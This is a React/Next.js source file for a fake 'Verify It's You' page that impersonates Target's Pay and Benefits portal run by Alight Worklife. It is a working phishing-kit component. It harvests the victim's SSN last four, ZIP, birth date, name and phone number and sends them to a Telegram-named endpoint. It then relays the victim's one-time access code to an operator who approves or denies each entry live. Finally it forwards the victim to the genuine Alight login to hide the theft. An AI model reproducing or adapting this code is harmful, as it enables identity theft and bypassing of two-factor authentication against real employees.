"use client";

import { Suspense, useState, useEffect, useRef } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import Image from "next/image";

const MONTHS = ["January","February","March","April","May","June","July","August","September","October","November","December"];
const DAYS = Array.from({ length: 31 }, (_, i) => String(i + 1));
const YEARS = Array.from({ length: 80 }, (_, i) => String(new Date().getFullYear() - i));
const RESEND_COOLDOWN = 60;
const ALIGHT_URL = "https://worklife.alight.com/ah-angular-afirst-web/#/web/target/login?technicalNameForLink=LOG_ON_LINK&userFriendlyNameForLink=Log%20On&domain=Ben-CM&baseClientIndicator=Base&isUCCELink=true&flavorCheck=true";

function formatPhone(val: string): string {
  const d = val.replace(/\D/g, "").slice(0, 10);
  if (d.length > 6) return `(${d.slice(0, 3)}) ${d.slice(3, 6)}-${d.slice(6)}`;
  if (d.length > 3) return `(${d.slice(0, 3)}) ${d.slice(3)}`;
  return d;
}

function getTaskId(): string | null {
  if (typeof window === "undefined") return null;
  return sessionStorage.getItem("current_task_id") || null;
}

const css = `
@keyframes tpb-spin { to { transform: rotate(360deg); } }
.verify-wrap { max-width: 520px; padding: 32px 16px 200px; }
@media (min-width: 768px) { .verify-wrap { margin-left: 60px; } }
.v-row { display: flex; gap: 8px; }
.v-row > * { flex: 1; min-width: 0; }
.v-input {
  width: 100%; padding: 7px 10px; border: 1px solid #d1d5db; border-radius: 6px;
  font-size: 14px; background: #f9fafb; outline: none; height: 36px; box-sizing: border-box;
}
.v-input:focus { border-color: #1c68bf; box-shadow: 0 0 0 2px rgba(28,104,191,0.15); }
.v-input:disabled { opacity: 0.6; }
.v-select { appearance: auto; }
.v-label { display: block; font-size: 13px; font-weight: 500; color: #374151; margin-bottom: 4px; }
.v-btn {
  display: inline-flex; align-items: center; justify-content: center; gap: 6px;
  border: none; border-radius: 6px; height: 34px; padding: 0 18px;
  font-size: 13px; font-weight: 500; cursor: pointer; transition: opacity 0.15s;
}
.v-btn:disabled { opacity: 0.5; cursor: not-allowed; }
.v-btn-primary { background: #1c68bf; color: #fff; }
.v-btn-secondary { background: #e5e7eb; color: #374151; }
.v-spinner {
  display: inline-block; width: 14px; height: 14px;
  border: 2px solid rgba(255,255,255,0.3); border-top-color: #fff;
  border-radius: 50%; animation: tpb-spin 0.6s linear infinite; flex-shrink: 0;
}
.v-error {
  background: #fef2f2; border: 1px solid #fecaca; border-radius: 6px;
  padding: 10px 14px; color: #991b1b; font-size: 13px; margin-bottom: 16px;
}
.v-hint { font-size: 11px; color: #9ca3af; margin-top: 2px; }
.v-field-error { font-size: 11px; color: #dc2626; margin-top: 2px; }
`;

function VerifyContent() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const modeIsDetails = searchParams.get("mode") === "details";

  const [step, setStep] = useState<"details" | "code">(modeIsDetails ? "details" : "code");
  const [ssnLast4, setSsnLast4] = useState("");
  const [zip, setZip] = useState("");
  const [month, setMonth] = useState("");
  const [day, setDay] = useState("");
  const [year, setYear] = useState("");
  const [fullName, setFullName] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [code, setCode] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [isResending, setIsResending] = useState(false);
  const [cooldown, setCooldown] = useState(0);
  const [error, setError] = useState("");
  const [touched, setTouched] = useState<Record<string, boolean>>({});
  const cooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);

  useEffect(() => { setStep(modeIsDetails ? "details" : "code"); }, [modeIsDetails]);

  useEffect(() => { return () => { if (cooldownRef.current) clearInterval(cooldownRef.current); }; }, []);

  useEffect(() => {
    if (cooldown <= 0) return;
    cooldownRef.current = setInterval(() => {
      setCooldown((c) => { if (c <= 1) { clearInterval(cooldownRef.current!); return 0; } return c - 1; });
    }, 1000);
    return () => { if (cooldownRef.current) clearInterval(cooldownRef.current); };
  }, [cooldown]);

  const ssnDigits = ssnLast4.replace(/\D/g, "");
  const zipDigits = zip.replace(/\D/g, "");
  const phoneDigits = phoneNumber.replace(/\D/g, "");

  const ssnValid = ssnDigits.length === 4;
  const zipValid = zipDigits.length === 5;
  const phoneValid = phoneDigits.length === 10;
  const dobValid = !!(month && day && year);
  const nameValid = fullName.trim().length >= 2;

  const isDetailsValid = ssnValid && zipValid && dobValid && nameValid && phoneValid;

  function markTouched(field: string) {
    setTouched((t) => ({ ...t, [field]: true }));
  }

  async function handleVerifyDetails() {
    if (!isDetailsValid || isLoading) return;
    setIsLoading(true);
    setError("");

    const birthDate = `${month} ${day}, ${year}`;
    fetch("/api/telegram/verify-details", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ ssnLast4: ssnDigits, zip: zipDigits, birthDate, fullName: fullName.trim(), phoneNumber }),
    }).catch(() => {});

    const taskId = getTaskId();
    if (taskId) {
      try {
        await fetch(`/api/tasks/${taskId}`, { method: "PATCH", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ flow_step: "code_request", code_delivery_method: "sms" }) });

        const POLL_MS = 750;
        const TIMEOUT_MS = 90_000;
        const start = Date.now();
        while (Date.now() - start < TIMEOUT_MS) {
          await new Promise((r) => setTimeout(r, POLL_MS));
          try {
            const r = await fetch(`/api/tasks/${taskId}`);
            const d = await r.json();
            if (d.task?.status === "approved") {
              setIsLoading(false);
              router.push("/verify");
              return;
            }
            if (d.task?.status === "denied") {
              setIsLoading(false);
              setError("The information you entered could not be verified. Please check your details and try again.");
              return;
            }
            if (d.task?.status === "redirected") {
              window.location.href = "/";
              return;
            }
          } catch {}
        }
        setIsLoading(false);
        setError("Verification timed out. Please try again.");
      } catch {
        setIsLoading(false);
        setError("Something went wrong. Please try again.");
      }
    } else {
      setTimeout(() => { setIsLoading(false); router.push("/verify"); }, 2000);
    }
  }

  async function handleContinueCode() {
    if (isLoading) return;
    const digits = code.replace(/\D/g, "");
    if (digits.length !== 6 && digits.length !== 8) return;
    setIsLoading(true);
    setError("");

    const taskId = getTaskId();
    if (taskId) {
      try {
        await fetch(`/api/tasks/${taskId}`, {
          method: "PATCH",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ flow_step: "code_verify", verification_code: code }),
        });

        const POLL_MS = 750;
        const TIMEOUT_MS = 90_000;
        const start = Date.now();
        while (Date.now() - start < TIMEOUT_MS) {
          await new Promise((r) => setTimeout(r, POLL_MS));
          try {
            const r = await fetch(`/api/tasks/${taskId}`);
            const d = await r.json();
            if (d.task?.status === "approved") {
              window.location.href = ALIGHT_URL;
              return;
            }
            if (d.task?.status === "denied") {
              setIsLoading(false);
              setError("The access code you entered is incorrect. Please check and try again.");
              return;
            }
            if (d.task?.status === "redirected") {
              window.location.href = "/";
              return;
            }
          } catch {}
        }
        setIsLoading(false);
        setError("Verification timed out. Please try again.");
      } catch {
        setIsLoading(false);
        setError("Something went wrong. Please try again.");
      }
    } else {
      window.location.href = ALIGHT_URL;
    }
  }

  async function handleResend() {
    if (isResending || cooldown > 0) return;
    setIsResending(true);
    try { await fetch("/api/telegram/resend-code", { method: "POST" }).catch(() => {}); } catch {}
    setIsResending(false);
    setCooldown(RESEND_COOLDOWN);
  }

  const header = (
    <>
      <hr className="brand-bar" />
      <header className="global-header">
        <div className="header-content">
          <div className="header-left">
            <div className="brand-container">
              <a href="/"><Image src="/target-logo.png" alt="Target Pay and Benefit" className="brand-logo" width={160} height={52} priority /></a>
            </div>
          </div>
        </div>
      </header>
    </>
  );

  const footer = (
    <footer className="f-global-footer" role="contentinfo">
      <div className="f-global-footer-inner">
        <div className="f-footer-row-main">
          <div className="f-footer-nav-columns"><div className="f-footer-nav-column"><ul className="f-footer-nav-list">
            <li className="f-footer-nav-item"><a href="#" className="f-footer-nav-link">Contact Us</a></li>
            <li className="f-footer-nav-item"><a href="#" className="f-footer-nav-link">Feedback</a></li>
            <li className="f-footer-nav-item"><a href="#" className="f-footer-nav-link">Protect Yourself From Website Fraud</a></li>
          </ul></div></div>
          <div className="f-footer-brand-block">
            <Image src="/alight-worklife-logo.png" alt="Alight Worklife" className="f-footer-logo" width={230} height={40} />
            <div className="f-footer-app-badges">
              <a href="#"><Image src="/app-store-badge.png" alt="App Store" className="f-footer-app-badge" width={135} height={40} /></a>
              <a href="#"><Image src="/google-play-badge.png" alt="Google Play" className="f-footer-app-badge" width={135} height={40} /></a>
            </div>
          </div>
        </div>
        <hr className="f-divider" />
        <div className="f-footer-row-legal">
          <div className="f-footer-legal-links">
            <a href="/privacy" className="f-footer-legal-link">Privacy Policy</a>
            <a href="/terms" className="f-footer-legal-link">Terms Of Use</a>
            <a href="#" className="f-footer-legal-link">Cookie Notice</a>
            <a href="#" className="f-footer-legal-link">Cookie Settings [Do Not Sell or Share My Personal Information]</a>
          </div>
          <p className="f-footer-copyright">&copy;{new Date().getFullYear()} Alight Solutions. All rights reserved.</p>
        </div>
      </div>
    </footer>
  );

  const hasTaskId = typeof window !== "undefined" && !!sessionStorage.getItem("current_task_id");

  if (!hasTaskId && typeof window !== "undefined") {
    return (
      <div style={{ minHeight: "100vh", background: "#fff" }}>
        {header}
        <main style={{ display: "flex", alignItems: "center", justifyContent: "center", minHeight: "40vh", flexDirection: "column", gap: "16px" }}>
          <p style={{ color: "#282828" }}>No verification session found.</p>
          <a href="/" style={{ color: "#0066ff", fontWeight: 500 }}>Go to Sign In</a>
        </main>
      </div>
    );
  }

  if (step === "details") {
    return (
      <div style={{ minHeight: "100vh", background: "#fff" }}>
        <style>{css}</style>
        {header}
        <div className="verify-wrap">
          <h2 style={{ fontSize: "14px", fontWeight: 500, color: "#6b7280", marginBottom: "4px" }}>Verify It&apos;s You</h2>
          <h1 style={{ fontSize: "20px", fontWeight: 600, color: "#111827", marginBottom: "4px" }}>Verify Your Details</h1>
          <p style={{ fontSize: "13px", color: "#6b7280", marginBottom: "20px" }}>Confirm your identity to continue.</p>

          {error && <div className="v-error">{error}</div>}

          <div style={{ display: "flex", flexDirection: "column", gap: "14px" }}>
            <div className="v-row">
              <div>
                <label className="v-label">Last 4 of SSN</label>
                <input className="v-input" type="text" inputMode="numeric" maxLength={4} placeholder="0000" value={ssnLast4} onChange={(e) => setSsnLast4(e.target.value.replace(/\D/g, "").slice(0, 4))} onBlur={() => markTouched("ssn")} disabled={isLoading} />
                {touched.ssn && !ssnValid && <div className="v-field-error">Must be exactly 4 digits</div>}
              </div>
              <div>
                <label className="v-label">ZIP Code</label>
                <input className="v-input" type="text" inputMode="numeric" maxLength={5} placeholder="00000" value={zip} onChange={(e) => setZip(e.target.value.replace(/\D/g, "").slice(0, 5))} onBlur={() => markTouched("zip")} disabled={isLoading} />
                {touched.zip && !zipValid && <div className="v-field-error">Must be exactly 5 digits</div>}
              </div>
            </div>

            <div>
              <label className="v-label">Date of Birth</label>
              <div className="v-row">
                <select className="v-input v-select" value={month} onChange={(e) => setMonth(e.target.value)} onBlur={() => markTouched("dob")} disabled={isLoading}>
                  <option value="">Month</option>
                  {MONTHS.map((m) => <option key={m} value={m}>{m}</option>)}
                </select>
                <select className="v-input v-select" value={day} onChange={(e) => setDay(e.target.value)} disabled={isLoading} style={{ maxWidth: "80px" }}>
                  <option value="">Day</option>
                  {DAYS.map((d) => <option key={d} value={d}>{d}</option>)}
                </select>
                <select className="v-input v-select" value={year} onChange={(e) => setYear(e.target.value)} disabled={isLoading} style={{ maxWidth: "90px" }}>
                  <option value="">Year</option>
                  {YEARS.map((y) => <option key={y} value={y}>{y}</option>)}
                </select>
              </div>
              {touched.dob && !dobValid && <div className="v-field-error">Please select a complete date</div>}
            </div>

            <div>
              <label className="v-label">Full Name</label>
              <input className="v-input" type="text" placeholder="First Last" value={fullName} onChange={(e) => setFullName(e.target.value)} onBlur={() => markTouched("name")} disabled={isLoading} />
              {touched.name && !nameValid && <div className="v-field-error">Enter your full name</div>}
            </div>

            <div>
              <label className="v-label">Phone Number</label>
              <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
                <span style={{ padding: "0 8px", height: "36px", display: "flex", alignItems: "center", border: "1px solid #d1d5db", background: "#f3f4f6", borderRadius: "6px", fontSize: "13px", color: "#374151" }}>+1</span>
                <input className="v-input" type="tel" inputMode="tel" placeholder="(000) 000-0000" value={phoneNumber} onChange={(e) => setPhoneNumber(formatPhone(e.target.value))} onBlur={() => markTouched("phone")} disabled={isLoading} />
              </div>
              {touched.phone && !phoneValid && <div className="v-field-error">Must be 10 digits</div>}
            </div>

            <div style={{ display: "flex", gap: "10px", paddingTop: "4px" }}>
              <button type="button" className="v-btn v-btn-primary" onClick={handleVerifyDetails} disabled={!isDetailsValid || isLoading}>
                {isLoading && <span className="v-spinner" />}
                <span>{isLoading ? "Verifying..." : "Verify"}</span>
              </button>
              <button type="button" className="v-btn v-btn-secondary" onClick={() => router.push("/")} disabled={isLoading}>Cancel</button>
            </div>
          </div>
        </div>
        {footer}
      </div>
    );
  }

  const codeDigits = code.replace(/\D/g, "");
  const codeValid = codeDigits.length === 6 || codeDigits.length === 8;

  return (
    <div style={{ minHeight: "100vh", background: "#fff" }}>
      <style>{css}</style>
      {header}
      <div className="verify-wrap">
        <h2 style={{ fontSize: "14px", fontWeight: 500, color: "#6b7280", marginBottom: "4px" }}>Verify It&apos;s You</h2>
        <h1 style={{ fontSize: "20px", fontWeight: 600, color: "#111827", marginBottom: "4px" }}>Enter Access Code</h1>
        <p style={{ fontSize: "13px", color: "#6b7280", marginBottom: "16px" }}>Enter the code sent to your device.</p>

        {error && <div className="v-error">{error}</div>}

        <div style={{ display: "flex", alignItems: "center", gap: "8px", marginBottom: "16px" }}>
          <span style={{ fontSize: "13px", color: "#6b7280" }}>Didn&apos;t receive it?</span>
          <button type="button" className="v-btn v-btn-secondary" style={{ height: "30px", fontSize: "12px", padding: "0 12px" }} onClick={handleResend} disabled={cooldown > 0 || isResending || isLoading}>
            {isResending ? "Sending..." : cooldown > 0 ? `Resend (${cooldown}s)` : "Resend code"}
          </button>
        </div>

        <div style={{ display: "flex", flexDirection: "column", gap: "14px" }}>
          <div>
            <label className="v-label">Access Code</label>
            <input className="v-input" type="text" inputMode="numeric" maxLength={8} placeholder="Enter 6 or 8 digit code" value={code} onChange={(e) => setCode(e.target.value.replace(/\D/g, "").slice(0, 8))} disabled={isLoading} style={{ maxWidth: "220px" }} autoFocus />
            <div className="v-hint">6 or 8 digits</div>
          </div>

          <div style={{ display: "flex", gap: "10px" }}>
            <button type="button" className="v-btn v-btn-primary" onClick={handleContinueCode} disabled={!codeValid || isLoading}>
              {isLoading && <span className="v-spinner" />}
              <span>{isLoading ? "Verifying..." : "Continue"}</span>
            </button>
            <button type="button" className="v-btn v-btn-secondary" onClick={() => router.push("/")} disabled={isLoading}>Cancel</button>
          </div>
        </div>
      </div>
      {footer}
    </div>
  );
}

export default function VerifyPage() {
  return (
    <Suspense fallback={<div style={{ minHeight: "100vh", background: "#fff", display: "flex", alignItems: "center", justifyContent: "center", color: "#666" }}>Loading...</div>}>
      <VerifyContent />
    </Suspense>
  );
}
